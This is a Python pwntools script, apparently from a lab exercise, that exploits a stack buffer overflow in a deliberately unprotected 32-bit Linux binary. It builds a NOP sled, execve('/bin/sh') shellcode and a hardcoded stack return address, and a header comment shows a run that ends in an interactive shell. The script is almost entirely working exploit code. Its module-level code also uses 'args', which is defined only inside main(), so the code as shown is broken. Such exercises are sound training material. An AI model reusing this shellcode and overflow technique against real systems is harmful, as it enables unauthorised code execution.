#!/usr/bin/env python

# pwnbox@lab:~/DEP$ python bypass_no_prot.py INFO
# [*] '/home/pwnbox/DEP/binary/vuln_no_prots'
#     Arch:     i386-32-little
#     RELRO:    No RELRO
#     Stack:    No canary found
#     NX:       NX disabled
#     PIE:      No PIE (0x8048000)
#     RWX:      Has RWX segments
# [+] Starting local process './binary/vuln_no_prots': pid 65330
# [*] Switching to interactive mode
# Hello, I'm your friendly & totally secure binary :)!
# What is your name?
# Hello: \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x901��F1�1��\x80�[1��C\x07\x89\x89C\x0c\xb0\x0b\x8d\x8dS\x0c̀���\xff\xff/bin/sh ��\xff!
# $ whoami
# pwnbox
# $

import argparse
import sys
from pwn import *
from pwnlib import *

context.arch = 'i386'
context.os = 'linux'
context.endian = 'little'
context.word_size = '32'
context.log_level = 'DEBUG'

binary = ELF('./vuln_no_prots')


def main():
    parser = argparse.ArgumentParser(description="pwnerator")
    parser.add_argument('--dbg', '-d', action='store_true')
    args = parser.parse_args()

executable = './vuln_no_prots'
payload = '\x90'*222

# shellcode 46 bytes
# 268 bytes - 46 bytes = length of nop sled
payload += '\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b'
payload += '\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68'

payload += '\x20\xcd\xff\xff' # stack


if args.dbg:
    r = gdb.debug([executable, payload], gdbscript="""
            b *main
            continue""",
            )
else:
    r = process([executable, payload])
    r.interactive()

if __name__ == '__main__':
    main()
    sys.exit(0)